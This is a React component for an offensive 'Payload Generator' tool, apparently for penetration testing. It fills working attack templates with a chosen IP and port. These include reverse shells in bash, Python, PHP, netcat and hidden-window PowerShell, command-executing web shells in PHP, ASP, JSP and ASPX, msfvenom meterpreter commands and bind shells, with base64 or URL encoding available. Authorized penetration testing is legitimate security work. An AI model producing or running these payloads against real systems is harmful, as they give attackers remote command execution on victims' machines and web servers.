import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { PageHeader } from '@/components/ui-custom/PageHeader';
import { Copy, Download, Zap } from "lucide-react";
import { toast } from "sonner";

const isValidIP = (ip) => {
  const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
  if (!ipRegex.test(ip)) return false;
  const parts = ip.split('.');
  return parts.every(part => parseInt(part, 10) >= 0 && parseInt(part, 10) <= 255);
};

const isValidPort = (port) => {
  const portNum = parseInt(port, 10);
  return portNum >= 1 && portNum <= 65535 && !isNaN(portNum);
};

export default function PayloadGenerator() {
  const [payloadType, setPayloadType] = useState('reverse_shell');
  const [ip, setIp] = useState('10.10.10.10');
  const [port, setPort] = useState('4444');
  const [shell, setShell] = useState('bash');
  const [encoding, setEncoding] = useState('none');
  const [output, setOutput] = useState('');

  const payloads = {
    reverse_shell: {
      bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      nc: `nc -e /bin/sh ${ip} ${port}`,
      powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    },
    web_shell: {
      php: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`,
      asp: `<%@ Language=VBScript %>\n<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>`,
      jsp: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
      aspx: `<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<script runat="server">\nvoid Page_Load(object sender, EventArgs e) {\n    ProcessStartInfo psi = new ProcessStartInfo();\n    psi.FileName = "cmd.exe";\n    psi.Arguments = "/c " + Request.QueryString["cmd"];\n    psi.RedirectStandardOutput = true;\n    psi.UseShellExecute = false;\n    Process p = Process.Start(psi);\n    Response.Write(p.StandardOutput.ReadToEnd());\n}\n</script>`
    },
    msfvenom: {
      windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o payload.exe`,
      linux: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o payload.elf`,
      android: `msfvenom -p android/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} R > payload.apk`,
      python: `msfvenom -p python/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f raw -o payload.py`
    },
    bind_shell: {
      bash: `nc -lvp ${port} -e /bin/bash`,
      python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",${port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
    }
  };

  const generatePayload = () => {
    const trimmedIp = ip.trim();
    const trimmedPort = port.trim();

    if (!trimmedIp) {
      toast.error('IP address required');
      return;
    }

    if (!isValidIP(trimmedIp)) {
      toast.error('Invalid IP address format');
      return;
    }

    if (!trimmedPort) {
      toast.error('Port required');
      return;
    }

    if (!isValidPort(trimmedPort)) {
      toast.error('Port must be between 1 and 65535');
      return;
    }

    let payload = payloads[payloadType]?.[shell] || 'Payload not available';
    
    if (encoding === 'base64') {
      payload = btoa(payload);
    } else if (encoding === 'url') {
      payload = encodeURIComponent(payload);
    }
    
    setOutput(payload);
    toast.success('Payload generated');
  };

  const copyToClipboard = () => {
    if (!output) {
      toast.error('No payload to copy');
      return;
    }
    navigator.clipboard.writeText(output).then(() => {
      toast.success('Payload copied to clipboard');
    }).catch(() => {
      toast.error('Failed to copy - clipboard access denied');
    });
    toast.success('Copied to clipboard');
  };

  const downloadPayload = () => {
    if (!output) {
      toast.error('No payload to download');
      return;
    }
    const blob = new Blob([output], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `payload_${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    a.remove();
    toast.success('Downloaded');
  };

  return (
    <div className="space-y-6">
      <PageHeader
        title="Payload Generator"
        description="Generate various offensive payloads for penetration testing"
      />

      <Card className="bg-black/40 backdrop-blur-md border-red-500/30">
        <CardHeader>
          <CardTitle className="text-white">Configuration</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="text-sm text-slate-300">Payload Type</label>
              <Select value={payloadType} onValueChange={(val) => {
                setPayloadType(val);
                setShell('bash');
                setOutput('');
              }}>
                <SelectTrigger className="bg-slate-900 border-slate-700 text-white">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-slate-800 border-slate-700">
                  <SelectItem value="reverse_shell">Reverse Shell</SelectItem>
                  <SelectItem value="bind_shell">Bind Shell</SelectItem>
                  <SelectItem value="web_shell">Web Shell</SelectItem>
                  <SelectItem value="msfvenom">Msfvenom Command</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <label className="text-sm text-slate-300">Shell Type</label>
              <Select value={shell} onValueChange={setShell}>
                <SelectTrigger className="bg-slate-900 border-slate-700 text-white">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-slate-800 border-slate-700">
                  {payloadType === 'reverse_shell' && (
                    <>
                      <SelectItem value="bash">Bash</SelectItem>
                      <SelectItem value="python">Python</SelectItem>
                      <SelectItem value="php">PHP</SelectItem>
                      <SelectItem value="nc">Netcat</SelectItem>
                      <SelectItem value="powershell">PowerShell</SelectItem>
                    </>
                  )}
                  {payloadType === 'web_shell' && (
                    <>
                      <SelectItem value="php">PHP</SelectItem>
                      <SelectItem value="asp">ASP</SelectItem>
                      <SelectItem value="jsp">JSP</SelectItem>
                      <SelectItem value="aspx">ASPX</SelectItem>
                    </>
                  )}
                  {payloadType === 'msfvenom' && (
                    <>
                      <SelectItem value="windows">Windows</SelectItem>
                      <SelectItem value="linux">Linux</SelectItem>
                      <SelectItem value="android">Android</SelectItem>
                      <SelectItem value="python">Python</SelectItem>
                    </>
                  )}
                  {payloadType === 'bind_shell' && (
                    <>
                      <SelectItem value="bash">Bash</SelectItem>
                      <SelectItem value="python">Python</SelectItem>
                    </>
                  )}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <label className="text-sm text-slate-300">IP Address (LHOST)</label>
              <Input
                value={ip}
                onChange={(e) => setIp(e.target.value.trim())}
                className="bg-slate-900 border-slate-700 text-white"
                placeholder="10.10.10.10"
                title="Your server IP. For bind shells, 0.0.0.0 listens on all interfaces."
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm text-slate-300">Port (LPORT)</label>
              <Input
                value={port}
                onChange={(e) => setPort(e.target.value.trim())}
                type="number"
                min="1"
                max="65535"
                className="bg-slate-900 border-slate-700 text-white"
                placeholder="4444"
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm text-slate-300">Encoding</label>
              <Select value={encoding} onValueChange={setEncoding}>
                <SelectTrigger className="bg-slate-900 border-slate-700 text-white">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-slate-800 border-slate-700">
                  <SelectItem value="none">None</SelectItem>
                  <SelectItem value="base64">Base64</SelectItem>
                  <SelectItem value="url">URL Encoding</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <Button onClick={generatePayload} className="w-full bg-gradient-to-r from-red-600 to-red-700">
            <Zap className="w-4 h-4 mr-2" />
            Generate Payload
          </Button>
        </CardContent>
      </Card>

      {output && (
        <Card className="bg-black/40 backdrop-blur-md border-red-500/30">
          <CardHeader>
            <CardTitle className="text-white">Generated Payload</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <Textarea
              value={output}
              readOnly
              className="min-h-[200px] font-mono text-sm bg-slate-900 border-slate-700 text-green-400"
            />
            <div className="flex gap-2">
              <Button onClick={copyToClipboard} variant="outline" className="flex-1 border-slate-700 text-white hover:bg-slate-700">
                <Copy className="w-4 h-4 mr-2" />
                Copy
              </Button>
              <Button onClick={downloadPayload} variant="outline" className="flex-1 border-slate-700 text-white hover:bg-slate-700">
                <Download className="w-4 h-4 mr-2" />
                Download
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      <Card className="bg-slate-800/50 border-amber-600/30">
        <CardContent className="pt-4">
          <p className="text-xs text-amber-400">
            ⚠️ These payloads are for authorized penetration testing only. Unauthorized use is illegal.
          </p>
        </CardContent>
      </Card>
    </div>
  );
}